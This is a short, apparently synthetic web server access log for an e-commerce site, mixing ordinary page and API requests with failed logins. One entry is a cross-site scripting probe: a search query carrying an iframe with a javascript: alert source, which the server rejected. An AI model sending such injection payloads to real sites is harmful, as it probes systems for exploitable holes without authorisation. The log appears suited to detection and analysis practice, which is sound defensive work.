192.168.1.21 - - [15/Jun/2025:00:48:57 +0000] "GET /api/orders HTTP/1.1" 200 6397 "https://www.ecommerce-site.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
10.0.0.99 - - [15/Jun/2025:00:11:51 +0000] "POST /api/login HTTP/1.1" 401 217 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.27 - - [15/Jun/2025:01:00:03 +0000] "GET /contact HTTP/1.1" 404 4981 "https://www.ecommerce-site.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
45.152.66.201 - - [15/Jun/2025:00:28:20 +0000] "GET /robots.txt HTTP/1.1" 200 3064 "-" "curl/8.5.0"
203.0.113.77 - - [15/Jun/2025:00:25:07 +0000] "GET /search?q=<iframe src=javascript:alert(1)></iframe> HTTP/1.1" 400 486 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.29 - - [15/Jun/2025:00:31:59 +0000] "GET /static/css/main.css HTTP/1.1" 304 7322 "-" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
192.168.1.21 - - [15/Jun/2025:00:53:39 +0000] "GET /contact HTTP/1.1" 200 7972 "https://www.google.com/" "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Mobile/15E148 Safari/604.1"
172.16.0.55 - - [15/Jun/2025:00:18:27 +0000] "POST /api/login HTTP/1.1" 401 216 "https://www.ecommerce-site.com/login" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
192.168.1.32 - - [15/Jun/2025:00:49:23 +0000] "GET /api/products?category=electronics HTTP/1.1" 404 5606 "https://www.google.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15"
192.168.1.31 - - [15/Jun/2025:00:33:08 +0000] "POST /products HTTP/1.1" 200 1136 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0"
